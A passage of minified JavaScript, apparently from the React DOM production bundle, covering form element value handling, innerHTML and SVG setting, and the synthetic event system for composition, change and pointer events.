r=0;r<n.length;r++)t["$"+n[r]]=!0;for(n=0;n<e.length;n++)r=t.hasOwnProperty("$"+e[n].value),e[n].selected!==r&&(e[n].selected=r),r&&a&&(e[n].defaultSelected=!0)}else{for(n=""+xe(n),t=null,r=0;r<e.length;r++){if(e[r].value===n)return e[r].selected=!0,void(a&&(e[r].defaultSelected=!0));null!==t||e[r].disabled||(t=e[r])}null!==t&&(t.selected=!0)}}function Me(e,t){if(null!=t.dangerouslySetInnerHTML)throw Error(o(91));return r({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Fe(e,t){var n=t.value;if(null==n){if(n=t.children,t=t.defaultValue,null!=n){if(null!=t)throw Error(o(92));if(Array.isArray(n)){if(!(1>=n.length))throw Error(o(93));n=n[0]}t=n}null==t&&(t=""),n=t}e._wrapperState={initialValue:xe(n)}}function De(e,t){var n=xe(t.value),a=xe(t.defaultValue);null!=n&&(n=""+n,n!==e.value&&(e.value=n),null==t.defaultValue&&e.defaultValue!==n&&(e.defaultValue=n)),null!=a&&(e.defaultValue=""+a)}function Ue(e){var t=e.textContent;t===e._wrapperState.initialValue&&""!==t&&null!==t&&(e.value=t)}var ze={html:"http://www.w3.org/1999/xhtml",mathml:"http://www.w3.org/1998/Math/MathML",svg:"http://www.w3.org/2000/svg"};function He(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Be(e,t){return null==e||"http://www.w3.org/1999/xhtml"===e?He(t):"http://www.w3.org/2000/svg"===e&&"foreignObject"===t?"http://www.w3.org/1999/xhtml":e}var We,Ve=function(e){return"undefined"!==typeof MSApp&&MSApp.execUnsafeLocalFunction?function(t,n,a,r){MSApp.execUnsafeLocalFunction((function(){return e(t,n,a,r)}))}:e}((function(e,t){if(e.namespaceURI!==ze.svg||"innerHTML"in e)e.innerHTML=t;else{for(We=We||document.createElement("div"),We.innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=We.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}}));function $e(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&3===n.nodeType)return void(n.nodeValue=t)}e.textContent=t}function Ge(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var Xe={animationend:Ge("Animation","AnimationEnd"),animationiteration:Ge("Animation","AnimationIteration"),animationstart:Ge("Animation","AnimationStart"),transitionend:Ge("Transition","TransitionEnd")},Qe={},Ke={};function Je(e){if(Qe[e])return Qe[e];if(!Xe[e])return e;var t,n=Xe[e];for(t in n)if(n.hasOwnProperty(t)&&t in Ke)return Qe[e]=n[t];return e}L&&(Ke=document.createElement("div").style,"AnimationEvent"in window||(delete Xe.animationend.animation,delete Xe.animationiteration.animation,delete Xe.animationstart.animation),"TransitionEvent"in window||delete Xe.transitionend.transition);var Ye=Je("animationend"),Ze=Je("animationiteration"),et=Je("animationstart"),tt=Je("transitionend"),nt="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),at=new("function"===typeof WeakMap?WeakMap:Map);function rt(e){var t=at.get(e);return void 0===t&&(t=new Map,at.set(e,t)),t}function lt(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do{t=e,0!==(1026&t.effectTag)&&(n=t.return),e=t.return}while(e)}return 3===t.tag?n:null}function ot(e){if(13===e.tag){var t=e.memoizedState;if(null===t&&(e=e.alternate,null!==e&&(t=e.memoizedState)),null!==t)return t.dehydrated}return null}function it(e){if(lt(e)!==e)throw Error(o(188))}function ct(e){var t=e.alternate;if(!t){if(t=lt(e),null===t)throw Error(o(188));return t!==e?null:e}for(var n=e,a=t;;){var r=n.return;if(null===r)break;var l=r.alternate;if(null===l){if(a=r.return,null!==a){n=a;continue}break}if(r.child===l.child){for(l=r.child;l;){if(l===n)return it(r),e;if(l===a)return it(r),t;l=l.sibling}throw Error(o(188))}if(n.return!==a.return)n=r,a=l;else{for(var i=!1,c=r.child;c;){if(c===n){i=!0,n=r,a=l;break}if(c===a){i=!0,a=r,n=l;break}c=c.sibling}if(!i){for(c=l.child;c;){if(c===n){i=!0,n=l,a=r;break}if(c===a){i=!0,a=l,n=r;break}c=c.sibling}if(!i)throw Error(o(189))}}if(n.alternate!==a)throw Error(o(190))}if(3!==n.tag)throw Error(o(188));return n.stateNode.current===n?e:t}function st(e){if(e=ct(e),!e)return null;for(var t=e;;){if(5===t.tag||6===t.tag)return t;if(t.child)t.child.return=t,t=t.child;else{if(t===e)break;for(;!t.sibling;){if(!t.return||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}}return null}function ut(e,t){if(null==t)throw Error(o(30));return null==e?t:Array.isArray(e)?Array.isArray(t)?(e.push.apply(e,t),e):(e.push(t),e):Array.isArray(t)?[e].concat(t):[e,t]}function dt(e,t,n){Array.isArray(e)?e.forEach(t,n):e&&t.call(n,e)}var mt=null;function pt(e){if(e){var t=e._dispatchListeners,n=e._dispatchInstances;if(Array.isArray(t))for(var a=0;a<t.length&&!e.isPropagationStopped();a++)b(e,t[a],n[a]);else t&&b(e,t,n);e._dispatchListeners=null,e._dispatchInstances=null,e.isPersistent()||e.constructor.release(e)}}function ht(e){if(null!==e&&(mt=ut(mt,e)),e=mt,mt=null,e){if(dt(e,pt),mt)throw Error(o(95));if(u)throw e=d,u=!1,d=null,e}}function gt(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),3===e.nodeType?e.parentNode:e}function ft(e){if(!L)return!1;e="on"+e;var t=e in document;return t||(t=document.createElement("div"),t.setAttribute(e,"return;"),t="function"===typeof t[e]),t}var Et=[];function bt(e){e.topLevelType=null,e.nativeEvent=null,e.targetInst=null,e.ancestors.length=0,10>Et.length&&Et.push(e)}function vt(e,t,n,a){if(Et.length){var r=Et.pop();return r.topLevelType=e,r.eventSystemFlags=a,r.nativeEvent=t,r.targetInst=n,r}return{topLevelType:e,eventSystemFlags:a,nativeEvent:t,targetInst:n,ancestors:[]}}function yt(e){var t=e.targetInst,n=t;do{if(!n){e.ancestors.push(n);break}var a=n;if(3===a.tag)a=a.stateNode.containerInfo;else{for(;a.return;)a=a.return;a=3!==a.tag?null:a.stateNode.containerInfo}if(!a)break;t=n.tag,5!==t&&6!==t||e.ancestors.push(n),n=zn(a)}while(n);for(n=0;n<e.ancestors.length;n++){t=e.ancestors[n];var r=gt(e.nativeEvent);a=e.topLevelType;var l=e.nativeEvent,o=e.eventSystemFlags;0===n&&(o|=64);for(var i=null,c=0;c<x.length;c++){var s=x[c];s&&(s=s.extractEvents(a,t,l,r,o))&&(i=ut(i,s))}ht(i)}}function kt(e,t,n){if(!n.has(e)){switch(e){case"scroll":an(t,"scroll",!0);break;case"focus":case"blur":an(t,"focus",!0),an(t,"blur",!0),n.set("blur",null),n.set("focus",null);break;case"cancel":case"close":ft(e)&&an(t,e,!0);break;case"invalid":case"submit":case"reset":break;default:-1===nt.indexOf(e)&&nn(e,t)}n.set(e,null)}}var wt,xt,jt,St=!1,Ct=[],At=null,Lt=null,Tt=null,Nt=new Map,Ot=new Map,It=[],Pt="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput close cancel copy cut paste click change contextmenu reset submit".split(" "),Rt="focus blur dragenter dragleave mouseover mouseout pointerover pointerout gotpointercapture lostpointercapture".split(" ");function _t(e,t){var n=rt(t);Pt.forEach((function(e){kt(e,t,n)})),Rt.forEach((function(e){kt(e,t,n)}))}function qt(e,t,n,a,r){return{blockedOn:e,topLevelType:t,eventSystemFlags:32|n,nativeEvent:r,container:a}}function Mt(e,t){switch(e){case"focus":case"blur":At=null;break;case"dragenter":case"dragleave":Lt=null;break;case"mouseover":case"mouseout":Tt=null;break;case"pointerover":case"pointerout":Nt.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ot.delete(t.pointerId)}}function Ft(e,t,n,a,r,l){return null===e||e.nativeEvent!==l?(e=qt(t,n,a,r,l),null!==t&&(t=Hn(t),null!==t&&xt(t)),e):(e.eventSystemFlags|=a,e)}function Dt(e,t,n,a,r){switch(t){case"focus":return At=Ft(At,e,t,n,a,r),!0;case"dragenter":return Lt=Ft(Lt,e,t,n,a,r),!0;case"mouseover":return Tt=Ft(Tt,e,t,n,a,r),!0;case"pointerover":var l=r.pointerId;return Nt.set(l,Ft(Nt.get(l)||null,e,t,n,a,r)),!0;case"gotpointercapture":return l=r.pointerId,Ot.set(l,Ft(Ot.get(l)||null,e,t,n,a,r)),!0}return!1}function Ut(e){var t=zn(e.target);if(null!==t){var n=lt(t);if(null!==n)if(t=n.tag,13===t){if(t=ot(n),null!==t)return e.blockedOn=t,void l.unstable_runWithPriority(e.priority,(function(){jt(n)}))}else if(3===t&&n.stateNode.hydrate)return void(e.blockedOn=3===n.tag?n.stateNode.containerInfo:null)}e.blockedOn=null}function zt(e){if(null!==e.blockedOn)return!1;var t=cn(e.topLevelType,e.eventSystemFlags,e.container,e.nativeEvent);if(null!==t){var n=Hn(t);return null!==n&&xt(n),e.blockedOn=t,!1}return!0}function Ht(e,t,n){zt(e)&&n.delete(t)}function Bt(){for(St=!1;0<Ct.length;){var e=Ct[0];if(null!==e.blockedOn){e=Hn(e.blockedOn),null!==e&&wt(e);break}var t=cn(e.topLevelType,e.eventSystemFlags,e.container,e.nativeEvent);null!==t?e.blockedOn=t:Ct.shift()}null!==At&&zt(At)&&(At=null),null!==Lt&&zt(Lt)&&(Lt=null),null!==Tt&&zt(Tt)&&(Tt=null),Nt.forEach(Ht),Ot.forEach(Ht)}function Wt(e,t){e.blockedOn===t&&(e.blockedOn=null,St||(St=!0,l.unstable_scheduleCallback(l.unstable_NormalPriority,Bt)))}function Vt(e){function t(t){return Wt(t,e)}if(0<Ct.length){Wt(Ct[0],e);for(var n=1;n<Ct.length;n++){var a=Ct[n];a.blockedOn===e&&(a.blockedOn=null)}}for(null!==At&&Wt(At,e),null!==Lt&&Wt(Lt,e),null!==Tt&&Wt(Tt,e),Nt.forEach(t),Ot.forEach(t),n=0;n<It.length;n++)a=It[n],a.blockedOn===e&&(a.blockedOn=null);for(;0<It.length&&(n=It[0],null===n.blockedOn);)Ut(n),null===n.blockedOn&&It.shift()}var $t={},Gt=new Map,Xt=new Map,Qt=["abort","abort",Ye,"animationEnd",Ze,"animationIteration",et,"animationStart","canplay","canPlay","canplaythrough","canPlayThrough","durationchange","durationChange","emptied","emptied","encrypted","encrypted","ended","ended","error","error","gotpointercapture","gotPointerCapture","load","load","loadeddata","loadedData","loadedmetadata","loadedMetadata","loadstart","loadStart","lostpointercapture","lostPointerCapture","playing","playing","progress","progress","seeking","seeking","stalled","stalled","suspend","suspend","timeupdate","timeUpdate",tt,"transitionEnd","waiting","waiting"];function Kt(e,t){for(var n=0;n<e.length;n+=2){var a=e[n],r=e[n+1],l="on"+(r[0].toUpperCase()+r.slice(1));l={phasedRegistrationNames:{bubbled:l,captured:l+"Capture"},dependencies:[a],eventPriority:t},Xt.set(a,t),Gt.set(a,l),$t[r]=l}}Kt("blur blur cancel cancel click click close close contextmenu contextMenu copy copy cut cut auxclick auxClick dblclick doubleClick dragend dragEnd dragstart dragStart drop drop focus focus input input invalid invalid keydown keyDown keypress keyPress keyup keyUp mousedown mouseDown mouseup mouseUp paste paste pause pause play play pointercancel pointerCancel pointerdown pointerDown pointerup pointerUp ratechange rateChange reset reset seeked seeked submit submit touchcancel touchCancel touchend touchEnd touchstart touchStart volumechange volumeChange".split(" "),0),Kt("drag drag dragenter dragEnter dragexit dragExit dragleave dragLeave dragover dragOver mousemove mouseMove mouseout mouseOut mouseover mouseOver pointermove pointerMove pointerout pointerOut pointerover pointerOver scroll scroll toggle toggle touchmove touchMove wheel wheel".split(" "),1),Kt(Qt,2);for(var Jt="change selectionchange textInput compositionstart compositionend compositionupdate".split(" "),Yt=0;Yt<Jt.length;Yt++)Xt.set(Jt[Yt],0);var Zt=l.unstable_UserBlockingPriority,en=l.unstable_runWithPriority,tn=!0;function nn(e,t){an(t,e,!1)}function an(e,t,n){var a=Xt.get(t);switch(void 0===a?2:a){case 0:a=rn.bind(null,t,1,e);break;case 1:a=ln.bind(null,t,1,e);break;default:a=on.bind(null,t,1,e)}n?e.addEventListener(t,a,!0):e.addEventListener(t,a,!1)}function rn(e,t,n,a){D||M();var r=on,l=D;D=!0;try{q(r,e,t,n,a)}finally{(D=l)||z()}}function ln(e,t,n,a){en(Zt,on.bind(null,e,t,n,a))}function on(e,t,n,a){if(tn)if(0<Ct.length&&-1<Pt.indexOf(e))e=qt(null,e,t,n,a),Ct.push(e);else{var r=cn(e,t,n,a);if(null===r)Mt(e,a);else if(-1<Pt.indexOf(e))e=qt(r,e,t,n,a),Ct.push(e);else if(!Dt(r,e,t,n,a)){Mt(e,a),e=vt(e,a,null,t);try{H(yt,e)}finally{bt(e)}}}}function cn(e,t,n,a){if(n=gt(a),n=zn(n),null!==n){var r=lt(n);if(null===r)n=null;else{var l=r.tag;if(13===l){if(n=ot(r),null!==n)return n;n=null}else if(3===l){if(r.stateNode.hydrate)return 3===r.tag?r.stateNode.containerInfo:null;n=null}else r!==n&&(n=null)}}e=vt(e,a,n,t);try{H(yt,e)}finally{bt(e)}return null}var sn={animationIterationCount:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},un=["Webkit","ms","Moz","O"];function dn(e,t,n){return null==t||"boolean"===typeof t||""===t?"":n||"number"!==typeof t||0===t||sn.hasOwnProperty(e)&&sn[e]?(""+t).trim():t+"px"}function mn(e,t){for(var n in e=e.style,t)if(t.hasOwnProperty(n)){var a=0===n.indexOf("--"),r=dn(n,t[n],a);"float"===n&&(n="cssFloat"),a?e.setProperty(n,r):e[n]=r}}Object.keys(sn).forEach((function(e){un.forEach((function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),sn[t]=sn[e]}))}));var pn=r({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function hn(e,t){if(t){if(pn[e]&&(null!=t.children||null!=t.dangerouslySetInnerHTML))throw Error(o(137,e,""));if(null!=t.dangerouslySetInnerHTML){if(null!=t.children)throw Error(o(60));if("object"!==typeof t.dangerouslySetInnerHTML||!("__html"in t.dangerouslySetInnerHTML))throw Error(o(61))}if(null!=t.style&&"object"!==typeof t.style)throw Error(o(62,""))}}function gn(e,t){if(-1===e.indexOf("-"))return"string"===typeof t.is;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var fn=ze.html;function En(e,t){e=9===e.nodeType||11===e.nodeType?e:e.ownerDocument;var n=rt(e);t=C[t];for(var a=0;a<t.length;a++)kt(t[a],e,n)}function bn(){}function vn(e){if(e=e||("undefined"!==typeof document?document:void 0),"undefined"===typeof e)return null;try{return e.activeElement||e.body}catch(t){return e.body}}function yn(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function kn(e,t){var n,a=yn(e);for(e=0;a;){if(3===a.nodeType){if(n=e+a.textContent.length,e<=t&&n>=t)return{node:a,offset:t-e};e=n}e:{for(;a;){if(a.nextSibling){a=a.nextSibling;break e}a=a.parentNode}a=void 0}a=yn(a)}}function wn(e,t){return!(!e||!t)&&(e===t||(!e||3!==e.nodeType)&&(t&&3===t.nodeType?wn(e,t.parentNode):"contains"in e?e.contains(t):!!e.compareDocumentPosition&&!!(16&e.compareDocumentPosition(t))))}function xn(){for(var e=window,t=vn();t instanceof e.HTMLIFrameElement;){try{var n="string"===typeof t.contentWindow.location.href}catch(a){n=!1}if(!n)break;e=t.contentWindow,t=vn(e.document)}return t}function jn(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&("input"===t&&("text"===e.type||"search"===e.type||"tel"===e.type||"url"===e.type||"password"===e.type)||"textarea"===t||"true"===e.contentEditable)}var Sn="$",Cn="/$",An="$?",Ln="$!",Tn=null,Nn=null;function On(e,t){switch(e){case"button":case"input":case"select":case"textarea":return!!t.autoFocus}return!1}function In(e,t){return"textarea"===e||"option"===e||"noscript"===e||"string"===typeof t.children||"number"===typeof t.children||"object"===typeof t.dangerouslySetInnerHTML&&null!==t.dangerouslySetInnerHTML&&null!=t.dangerouslySetInnerHTML.__html}var Pn="function"===typeof setTimeout?setTimeout:void 0,Rn="function"===typeof clearTimeout?clearTimeout:void 0;function _n(e){for(;null!=e;e=e.nextSibling){var t=e.nodeType;if(1===t||3===t)break}return e}function qn(e){e=e.previousSibling;for(var t=0;e;){if(8===e.nodeType){var n=e.data;if(n===Sn||n===Ln||n===An){if(0===t)return e;t--}else n===Cn&&t++}e=e.previousSibling}return null}var Mn=Math.random().toString(36).slice(2),Fn="__reactInternalInstance$"+Mn,Dn="__reactEventHandlers$"+Mn,Un="__reactContainere$"+Mn;function zn(e){var t=e[Fn];if(t)return t;for(var n=e.parentNode;n;){if(t=n[Un]||n[Fn]){if(n=t.alternate,null!==t.child||null!==n&&null!==n.child)for(e=qn(e);null!==e;){if(n=e[Fn])return n;e=qn(e)}return t}e=n,n=e.parentNode}return null}function Hn(e){return e=e[Fn]||e[Un],!e||5!==e.tag&&6!==e.tag&&13!==e.tag&&3!==e.tag?null:e}function Bn(e){if(5===e.tag||6===e.tag)return e.stateNode;throw Error(o(33))}function Wn(e){return e[Dn]||null}function Vn(e){do{e=e.return}while(e&&5!==e.tag);return e||null}function $n(e,t){var n=e.stateNode;if(!n)return null;var a=g(n);if(!a)return null;n=a[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(a=!a.disabled)||(e=e.type,a=!("button"===e||"input"===e||"select"===e||"textarea"===e)),e=!a;break e;default:e=!1}if(e)return null;if(n&&"function"!==typeof n)throw Error(o(231,t,typeof n));return n}function Gn(e,t,n){(t=$n(e,n.dispatchConfig.phasedRegistrationNames[t]))&&(n._dispatchListeners=ut(n._dispatchListeners,t),n._dispatchInstances=ut(n._dispatchInstances,e))}function Xn(e){if(e&&e.dispatchConfig.phasedRegistrationNames){for(var t=e._targetInst,n=[];t;)n.push(t),t=Vn(t);for(t=n.length;0<t--;)Gn(n[t],"captured",e);for(t=0;t<n.length;t++)Gn(n[t],"bubbled",e)}}function Qn(e,t,n){e&&n&&n.dispatchConfig.registrationName&&(t=$n(e,n.dispatchConfig.registrationName))&&(n._dispatchListeners=ut(n._dispatchListeners,t),n._dispatchInstances=ut(n._dispatchInstances,e))}function Kn(e){e&&e.dispatchConfig.registrationName&&Qn(e._targetInst,null,e)}function Jn(e){dt(e,Xn)}var Yn=null,Zn=null,ea=null;function ta(){if(ea)return ea;var e,t,n=Zn,a=n.length,r="value"in Yn?Yn.value:Yn.textContent,l=r.length;for(e=0;e<a&&n[e]===r[e];e++);var o=a-e;for(t=1;t<=o&&n[a-t]===r[l-t];t++);return ea=r.slice(e,1<t?1-t:void 0)}function na(){return!0}function aa(){return!1}function ra(e,t,n,a){for(var r in this.dispatchConfig=e,this._targetInst=t,this.nativeEvent=n,e=this.constructor.Interface,e)e.hasOwnProperty(r)&&((t=e[r])?this[r]=t(n):"target"===r?this.target=a:this[r]=n[r]);return this.isDefaultPrevented=(null!=n.defaultPrevented?n.defaultPrevented:!1===n.returnValue)?na:aa,this.isPropagationStopped=aa,this}function la(e,t,n,a){if(this.eventPool.length){var r=this.eventPool.pop();return this.call(r,e,t,n,a),r}return new this(e,t,n,a)}function oa(e){if(!(e instanceof this))throw Error(o(279));e.destructor(),10>this.eventPool.length&&this.eventPool.push(e)}function ia(e){e.eventPool=[],e.getPooled=la,e.release=oa}r(ra.prototype,{preventDefault:function(){this.defaultPrevented=!0;var e=this.nativeEvent;e&&(e.preventDefault?e.preventDefault():"unknown"!==typeof e.returnValue&&(e.returnValue=!1),this.isDefaultPrevented=na)},stopPropagation:function(){var e=this.nativeEvent;e&&(e.stopPropagation?e.stopPropagation():"unknown"!==typeof e.cancelBubble&&(e.cancelBubble=!0),this.isPropagationStopped=na)},persist:function(){this.isPersistent=na},isPersistent:aa,destructor:function(){var e,t=this.constructor.Interface;for(e in t)this[e]=null;this.nativeEvent=this._targetInst=this.dispatchConfig=null,this.isPropagationStopped=this.isDefaultPrevented=aa,this._dispatchInstances=this._dispatchListeners=null}}),ra.Interface={type:null,target:null,currentTarget:function(){return null},eventPhase:null,bubbles:null,cancelable:null,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:null,isTrusted:null},ra.extend=function(e){function t(){}function n(){return a.apply(this,arguments)}var a=this;t.prototype=a.prototype;var l=new t;return r(l,n.prototype),n.prototype=l,n.prototype.constructor=n,n.Interface=r({},a.Interface,e),n.extend=a.extend,ia(n),n},ia(ra);var ca=ra.extend({data:null}),sa=ra.extend({data:null}),ua=[9,13,27,32],da=L&&"CompositionEvent"in window,ma=null;L&&"documentMode"in document&&(ma=document.documentMode);var pa=L&&"TextEvent"in window&&!ma,ha=L&&(!da||ma&&8<ma&&11>=ma),ga=String.fromCharCode(32),fa={beforeInput:{phasedRegistrationNames:{bubbled:"onBeforeInput",captured:"onBeforeInputCapture"},dependencies:["compositionend","keypress","textInput","paste"]},compositionEnd:{phasedRegistrationNames:{bubbled:"onCompositionEnd",captured:"onCompositionEndCapture"},dependencies:"blur compositionend keydown keypress keyup mousedown".split(" ")},compositionStart:{phasedRegistrationNames:{bubbled:"onCompositionStart",captured:"onCompositionStartCapture"},dependencies:"blur compositionstart keydown keypress keyup mousedown".split(" ")},compositionUpdate:{phasedRegistrationNames:{bubbled:"onCompositionUpdate",captured:"onCompositionUpdateCapture"},dependencies:"blur compositionupdate keydown keypress keyup mousedown".split(" ")}},Ea=!1;function ba(e,t){switch(e){case"keyup":return-1!==ua.indexOf(t.keyCode);case"keydown":return 229!==t.keyCode;case"keypress":case"mousedown":case"blur":return!0;default:return!1}}function va(e){return e=e.detail,"object"===typeof e&&"data"in e?e.data:null}var ya=!1;function ka(e,t){switch(e){case"compositionend":return va(t);case"keypress":return 32!==t.which?null:(Ea=!0,ga);case"textInput":return e=t.data,e===ga&&Ea?null:e;default:return null}}function wa(e,t){if(ya)return"compositionend"===e||!da&&ba(e,t)?(e=ta(),ea=Zn=Yn=null,ya=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return ha&&"ko"!==t.locale?null:t.data;default:return null}}var xa={eventTypes:fa,extractEvents:function(e,t,n,a){var r;if(da)e:{switch(e){case"compositionstart":var l=fa.compositionStart;break e;case"compositionend":l=fa.compositionEnd;break e;case"compositionupdate":l=fa.compositionUpdate;break e}l=void 0}else ya?ba(e,n)&&(l=fa.compositionEnd):"keydown"===e&&229===n.keyCode&&(l=fa.compositionStart);return l?(ha&&"ko"!==n.locale&&(ya||l!==fa.compositionStart?l===fa.compositionEnd&&ya&&(r=ta()):(Yn=a,Zn="value"in Yn?Yn.value:Yn.textContent,ya=!0)),l=ca.getPooled(l,t,n,a),r?l.data=r:(r=va(n),null!==r&&(l.data=r)),Jn(l),r=l):r=null,(e=pa?ka(e,n):wa(e,n))?(t=sa.getPooled(fa.beforeInput,t,n,a),t.data=e,Jn(t)):t=null,null===r?t:null===t?r:[r,t]}},ja={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Sa(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return"input"===t?!!ja[e.type]:"textarea"===t}var Ca={change:{phasedRegistrationNames:{bubbled:"onChange",captured:"onChangeCapture"},dependencies:"blur change click focus input keydown keyup selectionchange".split(" ")}};function Aa(e,t,n){return e=ra.getPooled(Ca.change,e,t,n),e.type="change",P(n),Jn(e),e}var La=null,Ta=null;function Na(e){ht(e)}function Oa(e){var t=Bn(e);if(Ae(t))return e}function Ia(e,t){if("change"===e)return t}var Pa=!1;function Ra(){La&&(La.detachEvent("onpropertychange",_a),Ta=La=null)}function _a(e){if("value"===e.propertyName&&Oa(Ta))if(e=Aa(Ta,e,gt(e)),D)ht(e);else{D=!0;try{_(Na,e)}finally{D=!1,z()}}}function qa(e,t,n){"focus"===e?(Ra(),La=t,Ta=n,La.attachEvent("onpropertychange",_a)):"blur"===e&&Ra()}function Ma(e){if("selectionchange"===e||"keyup"===e||"keydown"===e)return Oa(Ta)}function Fa(e,t){if("click"===e)return Oa(t)}function Da(e,t){if("input"===e||"change"===e)return Oa(t)}L&&(Pa=ft("input")&&(!document.documentMode||9<document.documentMode));var Ua={eventTypes:Ca,_isInputEventSupported:Pa,extractEvents:function(e,t,n,a){var r=t?Bn(t):window,l=r.nodeName&&r.nodeName.toLowerCase();if("select"===l||"input"===l&&"file"===r.type)var o=Ia;else if(Sa(r))if(Pa)o=Da;else{o=Ma;var i=qa}else(l=r.nodeName)&&"input"===l.toLowerCase()&&("checkbox"===r.type||"radio"===r.type)&&(o=Fa);if(o&&(o=o(e,t)))return Aa(o,n,a);i&&i(e,r,t),"blur"===e&&(e=r._wrapperState)&&e.controlled&&"number"===r.type&&Pe(r,"number",r.value)}},za=ra.extend({view:null,detail:null}),Ha={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Ba(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):!!(e=Ha[e])&&!!t[e]}function Wa(){return Ba}var Va=0,$a=0,Ga=!1,Xa=!1,Qa=za.extend({screenX:null,screenY:null,clientX:null,clientY:null,pageX:null,pageY:null,ctrlKey:null,shiftKey:null,altKey:null,metaKey:null,getModifierState:Wa,button:null,buttons:null,relatedTarget:function(e){return e.relatedTarget||(e.fromElement===e.srcElement?e.toElement:e.fromElement)},movementX:function(e){if("movementX"in e)return e.movementX;var t=Va;return Va=e.screenX,Ga?"mousemove"===e.type?e.screenX-t:0:(Ga=!0,0)},movementY:function(e){if("movementY"in e)return e.movementY;var t=$a;return $a=e.screenY,Xa?"mousemove"===e.type?e.screenY-t:0:(Xa=!0,0)}}),Ka=Qa.extend({pointerId:null,width:null,height:null,pressure:null,tangentialPressure:null,tiltX:null,tiltY:null,twist:null,pointerType:null,isPrimary:null}),Ja={mouseEnter:{registrationName:"onMouseEnter",dependencies:["mouseout","mouseover"]},mouseLeave:{registrationName:"onMouseLeave",dependencies:["mouseout","mouseover"]},pointerEnter:{registrationName:"onPointerEnter",dependencies:["pointerout","pointerover"]},pointerLeave:{registrationName:"onPointerLeave",dependencies:["pointerout","pointerover"]}},Ya={eventTypes:Ja,extractEvents:function(e,t,n,a,r){var l="mouseover"===e||"pointerover"===e,o="mouseout"===e||"pointerout"===e;if(l&&0===(32&r)&&(n.relatedTarget||n.fromElement)||!o&&!l)return null;if(l=a.window===a?a:(l=a.ownerDocument)?l.defaultView||l.parentWindow:window,o){if(o=t,t=(t=n.relatedTarget||n.toElement)?zn(t):null,null!==t){var i=lt(t);(t!==i||5!==t.tag&&6!==t.tag)&&(t=null)}}else o=null;if(o===t)return null;if("mouseout"===e||"mouseover"===e)var c=Qa,s=Ja.mouseLeave,u=Ja.mouseEnter,d="mouse";else"pointerout"!==e&&"pointerover"!==e||(c=Ka,s=Ja.pointerLeave,u=Ja.pointerEnter,d="pointer");if(e=null==o?l:Bn(o),l=null==t?l:Bn(t),s=c.getPooled(s,o,n,a),s.type=d+"leave",s.target=e,s.relatedTarget=l,n=c.getPooled(u,t,n,a),n.type=d+"enter",n.target=l,n.relatedTarget=e,a=o,d=t,a&&d)e:{for(c=a,u=d,o=0,e=c;e;e=Vn(e))o++;for(e=0,t=u;t;t=Vn(t))e++;for(;0<o-e;)c=Vn(c),o--;for(;0<e-o;)u=Vn(u),e--;for(;o--;){if(c===u||c===u.alternate)break e;c=Vn(c),u=Vn(u)}c=null}else c=null;for(u=c,c=[];a&&a!==u;){if(o=a.alternate,null!==o&&o===u)break;c.push(a),a=Vn(a)}for(a=[];d&&d!==u;){if(o=d.alternate,null!==o&&o===u)break;a.push(d),d=Vn(d)}for(d=0;d<c.length;d++)Qn(c[d],"bubbled",s);for(d=a.length;0<d--;)Qn(a[d],"captured",n);return 0===(64&r)?[s]:[s,n]}};function Za(e,t){return e===t&&(0!==e||1/e===1/t)||e!==e&&t!==t}var er="function"===typeof Object.is?Object.is:Za,tr=Object.prototype.hasOwnProperty;function 